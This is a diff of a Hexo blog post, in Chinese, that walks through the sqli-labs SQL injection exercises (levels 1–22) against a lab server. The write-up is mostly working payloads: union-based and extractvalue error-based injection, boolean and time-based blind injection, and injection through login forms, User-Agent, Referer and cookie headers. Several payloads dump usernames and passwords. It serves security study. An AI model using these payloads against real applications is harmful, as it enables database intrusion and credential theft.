@@ -8,7 +8,7 @@
     <link rel="apple-touch-icon" sizes="76x76" href="/null">
     <link rel="icon" type="image/png" href="/null">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
-    <title>sql注入 - Hexo</title>
+    <title>Hexo</title>
     
     <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
     
@@ -406,7 +406,7 @@ header .header__right .dropdown-menus .dropdown-menu {
 <article class="page">
 <div id="post-meta-m">
     <div class="post-meta" id="post-meta">
-  <h3>sql注入</h3>
+  <h3></h3>
     
       <span class="post-meta-label">
         John Doe
@@ -424,7 +424,7 @@ header .header__right .dropdown-menus .dropdown-menu {
       
       <span class="post-meta">
         <span class="p-dot"></span>
-        共 916 字
+        共 1.9k 字
       </span>
     
     
@@ -443,6 +443,9 @@ header .header__right .dropdown-menus .dropdown-menu {
         <p>sql注入<br>union联合注入(前四关关同理)<br>1.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>   //报错,说明存在注入<br>2.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>  and 1=1–+ //显示数据<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a>  and 1=2–+ //没有显示数据，说明这是个基于单引号的字符型注入<br>判断是整形注入还是字符型注入<br>数字型注入与字符型注入的最大去区别在于<br>数字型不需要闭合，而字符型需要引号闭合<br>select * from table where id = 1   数字型<br>select * from table where username = ‘admin’   字符型<br>在第一关中上述可以，第二关中?id=1  and 1=1–+显示数据，id=1  and 1=2–+ //没有显示数据，说明这是个基于数值型注入<br>第三关中 向页面输入?id=1’,报错 ,发现报错信息中有括号闭合，那就变成 ?id=1’)  and 1=1–+显示数据，id=1’)  and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的<br>第四关中于第三关相同输入?id=1”,报错 ,发现报错信息中有括号闭合，那就变成?id=1”)  and 1=1–+显示数据，id=1”)  and 1=2–+ //没有显示数据，说明是(‘’)这种方式闭合字符串的  </p>
 <p>3.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> order by 4–+  //分别进行从一开始的实验，找到有几个字段，order by 3回显正常 order by 4回显不正常说明存在3列数据( 在注释符被过滤的时候，ordey by查询语句，在用对应符号闭合会出现问题，可以使用联合查询的特性：UNION 内部的 SELECT 语句必须拥有相同数量的列,来确定字段数。?id=-1’ union select 1,2,3,4 –+多出的4超过了前面查询语句的列数就会报错：The used SELECT statements have a different number of columns)<br>4.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,3–+ //用来联合查询，但是只能输出后面的查询，所以把前面的查询结果为空值，显示2，3，说明可以使用2，3这两个位置。<br>5.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+ //查询所有数据库的名字（也可以直接用?id=-1’ union select 1,database(),3–+ 查询数据库）<br>6.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+ //查询数据库security中所有表名<br>7.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=’users’) –+  //查询表users中的所有列名<br>8.<a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=-1&#39;">http://45.32.113.109:44709/Less-1/?id=-1&#39;</a> union select 1,2,(select group_concat(id,0x3a,username,0x3a,password) from users) –+  //查询表users中的所有信息（0x3a代表的是：）</p>
 <p>报错注入<br>● 该函数对xml文档进行查询。<br>● extractvalue(xml_frag,xpath_expr) 第一个参数式是查询内容，第二个参数是查询路径。<br>● 原理：当路径写入格式错误就会报错，显示出来，同时还会写入我们的非法查询语句并将查询的结果返回出来，所以在第二个参数位置构造sql语句进行注入<br>● and extractvalue(1, payload)<br>输出字符有长度限制，最长32位。<br>payload即我们要输入的sql查询语句<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select user())))) –+  //更换select后的语句进行查询 （版本version()  数据库database()）<br><a target="_blank" rel="noopener" href="http://45.32.113.109:44709/Less-1/?id=1&#39;">http://45.32.113.109:44709/Less-1/?id=1&#39;</a> and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) –+  //列如这样 里面语句和上面union一样</p>
+<p>第五关<br>id=1’ 发现报错 id=1’ –+ 不报错但是回显的内容和初始内容一样，说明这个为可以用布尔盲注，时间盲注，报错注入<br>布尔盲注：<br>?id=1’ and substr((select database()),n,1)=’s’–+     通过这个语句判断出数据库的名字，不断改变n的值来，看是否有回显，正确有回显，错误没有回显   判断’s’可以用burp工具来进行  最终确定的库名为security。<br>?id=1’ and substr((select table_name from information_schema.tables where table_schema=’security’ limit x,1),n,1)=’s’–+   修改limit x,1和中x 可以选择第几个表, substr中的n用来判断表名每个位置的字母，爆破到第一张表为referer，终于在第三张表爆破到users表。<br>?id=1’ and substr((select column_name from information_schema.columns where table_name=’users’ limit x,1),n,1)=’u’–+ 同理找到第一个字段为username第2个字段为password<br>?id=1’ and substr((select username from users limit 0,1),n,1)=’d’–+ 同理找到其中数据<br>?id=1’ and substr((select password from users limit 0,1),n,1)=’d’–+</p>
+<p>时间盲注：<br>?id=1’ and if((substr((select database()),n,1)=’s’),sleep(10),1) –+  和布尔同理通过改变n 来确定数据库名， 正确会延迟，错误没有延迟<br>举一反三 把里面的内容替换，如上面布尔盲注，就可找到数据</p>
+<p>第六关（双引号字符型注入，方法与第五关相同）<br>第七关 （8会）<br>第八关   id=1回显，加个单引号不回显，构造一下验证是不是布尔型payload ?id=1’ and 1=1 –+ 回显了，证明没跑了。<br>第九关    不管怎么输入，回显总是you are .  ..<br>?id=1’ and sleep(5)–+  发现明显延迟，说明注入成功，接下来爆破就完了<br>第十关 基于双引号的时间盲注<br>只要把上一题Less-9的单引号改成双引号，一样的注入，不再赘述。<br>第十一关 是一个登陆页面，通常post传送不能在url上看到数据，只能通过抓包工具进行查看<br>输入admin admin 登陆，抓包，发送到repeater模块 在repeater中通过修改post的参数进行注入<br>admin’ and 1=1# 可以登录<br>admin’ and 1=2# 不可以登录<br> 说明注入生效，存在报错型注入，接下来又是重复性工作，上extractvalue()<br>admin’ and extractvalue(1,concat(0x7e,(select datbase())))#<br>也可以使用union<br>admin’ order by 2#<br>0’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #<br>第十二关<br>admin”) 进行注入<br>第十三关发现登陆成功没有回显，所以可以用报错注入，时间盲注<br>admin’) and extractvalue(1,concat(0x7e,(select database())))#<br>admin’) and if((substr((select database()),1,1)=’s’),sleep(5),1)#<br>第十四关 基于” 的注入（报错注入，时间盲注）<br>同上一关<br>第十五关 登录后没有回显  admin’ #登录成功 说明是基余’的注入<br>用报错注入发现显示不了数据，时间延迟注入可以！<br>第十六关 和上一关相同 admin”)#基余”)的注入<br>第十七关 实在密码部分的注入<br>前面用户名填admin 后面密码：admin’ and extractvalue(1,concat(0x7e,(select version())))#<br>第十八关   我们直接在user_agent中进行测试，加入单引号后出现报错信息，根据报错信息  猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘User-Agent’,’Ip’,’Username’)  三个参数<br>通过报错注入：’,extractvalue(1,concat(0x7e,(select user()),0x7e)) ,1)#<br>第十九关 我们抓取数据包，在referter上来做文章，先输入个单引号看下错误信息<br>猜想在数据中的sql语句为：INSEERT INTO table VALUES(‘Referter’,’Ip’,)<br>那我们就构造sql语句来满足insert函数<br>这时的sql语句为INSEERT INTO table VALUES(‘1’,1)#’,’Ip’,) 两个参数采用报错注入<br>‘,extractvalue(1,concat(0x7e,(select database()))))#<br>第二十关 cookie注入<br>‘ and extractvalue(1,concat(0x7e,(select database())))#<br>第二十一关 也是cookie 但是cookie通过base64加密了<br>‘ )and extractvalue(1,concat(0x7e,(select database())))#加密一下就好<br>第二十二关 同上一关相同 闭合方式为’</p>
 
       </div>
     </div>
